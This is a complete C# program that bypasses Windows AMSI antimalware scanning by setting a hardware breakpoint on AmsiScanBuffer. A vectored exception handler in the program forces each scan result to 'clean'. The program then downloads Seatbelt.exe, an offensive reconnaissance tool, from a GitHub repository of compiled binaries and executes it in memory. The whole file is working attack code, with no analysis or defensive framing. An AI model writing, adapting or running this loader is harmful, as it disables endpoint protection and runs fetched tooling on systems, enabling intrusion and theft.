using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace t1
{
    class Program
    {
        static IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
        static IntPtr pAmsiScanBuffer = WinAPI.GetProcAddress(amsiBase, "AmsiScanBuffer");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));

        static void Main(string[] args)
        {
            try
            {
                SetupBypass();
                
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"));
                sb.EntryPoint.Invoke(null, new object[] { new string[] { "" } });
                Console.WriteLine(sb.FullName);
            }
            catch (Exception ex)
            {
                LogError("Main", ex);
            }
        }

        static void SetupBypass()
        {
            try
            {
                WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
                ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

                MethodInfo method = typeof(Program).GetMethod(nameof(Handler), BindingFlags.Static | BindingFlags.Public);
                IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());

                Marshal.StructureToPtr(ctx, pCtx, true);
                bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
                ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

                EnableBreakpoint(ctx, pAmsiScanBuffer, 0);

                WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
            }
            catch (Exception ex)
            {
                LogError("SetupBypass", ex);
            }
        }

        public static long Handler(IntPtr exceptions)
        {
            try
            {
                WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
                ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

                WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
                ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

                WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
                ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

                if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pAmsiScanBuffer)
                {
                    ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                    IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8)));
                    Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
                    Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));

                    Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                    ContextRecord.Rip = ReturnAddress;
                    ContextRecord.Rsp += 8;
                    ContextRecord.Rax = 0;

                    ContextRecord.Dr0 = 0;
                    ContextRecord.Dr7 = SetBits(ContextRecord.Dr7, 0, 1, 0);
                    ContextRecord.Dr6 = 0;
                    ContextRecord.EFlags = 0;

                    Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true);
                    return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
                }
                else
                {
                    return WinAPI.EXCEPTION_CONTINUE_SEARCH;
                }
            }
            catch (Exception ex)
            {
                LogError("Handler", ex);
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }
        }

        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            try
            {
                switch (index)
                {
                    case 0:
                        ctx.Dr0 = (ulong)address.ToInt64();
                        break;
                    case 1:
                        ctx.Dr1 = (ulong)address.ToInt64();
                        break;
                    case 2:
                        ctx.Dr2 = (ulong)address.ToInt64();
                        break;
                    case 3:
                        ctx.Dr3 = (ulong)address.ToInt64();
                        break;
                }

                ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
                ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
                ctx.Dr6 = 0;

                Marshal.StructureToPtr(ctx, pCtx, true);
            }
            catch (Exception ex)
            {
                LogError("EnableBreakpoint", ex);
            }
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }

        private static void LogError(string method, Exception ex)
        {
            string logPath = "error_log.txt";
            File.AppendAllText(logPath, $"{DateTime.Now} - {method}: {ex.Message}{Environment.NewLine}{ex.StackTrace}{Environment.NewLine}");
        }
    }

    class WinAPI
    {
        public const int AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return $"High:{High}, Low:{Low}";
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
} 